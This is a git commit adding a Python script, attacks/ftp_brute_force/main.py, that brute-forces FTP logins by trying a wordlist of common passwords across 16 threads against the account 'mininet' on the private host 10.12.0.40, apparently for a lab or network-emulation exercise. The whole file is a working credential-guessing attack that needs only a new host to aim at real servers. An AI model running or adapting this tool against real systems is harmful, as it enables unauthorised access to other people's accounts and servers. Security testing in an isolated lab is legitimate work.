2a1b3b427fbc0e08b717491c79865207ad111781
Ammaruus <aissouamr@gmail.com>
2025-04-18 15:00:22 +0000

    ftp_ bf setup

---
+++ attacks/ftp_brute_force/main.py
@@ -0,0 +1,51 @@
+import sys
+import os
+import time
+import ftplib
+import concurrent.futures
+
+
+def ftp_login(host, username, password):
+    """
+    Try to login to the FTP server with the given credentials
+    """
+    try:
+        with ftplib.FTP(host) as ftp:
+            ftp.login(username, password)
+            print(f"Found Password : {password} for account : {username}")
+            return True
+    except:
+        return False
+
+
+if __name__ == '__main__':
+    host = "10.12.0.40"
+    username = "mininet"
+    wordlist = "most-common.txt"
+
+    if not os.path.exists(wordlist):
+        print("\nPlease move the file 'most-common.txt' into the correct directory")
+        sys.exit(1)
+
+    print(f'Starting threaded FTP bruteforce on {host} with account: {username}')
+    start_time = time.time()
+
+    with open(wordlist, 'r') as f:
+        passwords = f.readlines()
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
+            futures = []
+            for password in passwords:
+                password = password.strip()
+                print(f"Trying Login : {password}")
+                futures.append(executor.submit(
+                    ftp_login, host, username, password))
+
+            for future in concurrent.futures.as_completed(futures):
+                if future.result():
+                    executor.shutdown(wait=False)
+                    print(f"Time taken : {time.time() - start_time}s")
+                    sys.exit(0)
+
+    print('Password not found')
+    print(f"Time taken : {time.time() - start_time}s")
